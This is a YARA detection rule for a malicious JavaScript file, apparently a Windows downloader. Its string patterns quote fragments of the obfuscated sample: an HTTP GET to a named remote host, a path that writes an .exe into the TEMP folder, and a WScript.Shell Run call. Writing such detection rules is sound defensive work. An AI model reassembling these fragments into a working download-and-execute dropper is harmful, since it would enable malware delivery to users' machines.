rule sig_20160330_84195ba0929820d1d3576699c0b01023 {
  meta:
    description = "datamaliciousorder - file 20160330_84195ba0929820d1d3576699c0b01023.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8473629dee6841c92beae14176f68180ed6de048d739b898a860d73d8453a58a"

  strings:
    $s1  = "_S[_Z](\"GET\", \"http://pro.monbento.com/n3iska\", false);" fullword ascii
    $s2  = "var _LP = function _Q() {return WScript[_Q0](\"WScript\"+\".Shell\");}(), _UZ = 11;" fullword ascii
    $s3  = "function _K(_B0, _XK){_P = _P * 1; return _B0 - _XK;};" fullword ascii
    $s4  = "if (_S[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _U() {return _LP[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Y7cFuBaOhFV.ex\" + \"e\";};" fullword ascii
    $s6  = "function _BP(){return _DW + \"\";};" fullword ascii
    $s7  = "function _DA() {return ((_MH == true) && (_MH == _P0)) ? 1 : _P;};" fullword ascii
    $s8  = "function _W(_X){_LP[\"Run\"](_X, _P, _P);};" fullword ascii
    $s9  = "function _HV(){return _Q0;};" fullword ascii
    $s10 = "function _OO(_U0) {var _F = (1, 2, 3, 4, 5, _U0); return _F;};" fullword ascii
    $s11 = "var _ND = new this[\"Date\"]();" fullword ascii
    $s12 = "function _UV()" fullword ascii
    $s13 = " while (_SX){" fullword ascii
    $s14 = "function _L(){return 22;};" fullword ascii
    $s15 = "return _K(_A, _G0);" fullword ascii
    $s16 = "_P0 = true; " fullword ascii
    $s17 = "var _P0 = false;" fullword ascii
    $s18 = "var _ZN = false;" fullword ascii
    $s19 = "_MH = true; " fullword ascii
    $s20 = "var _MH = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}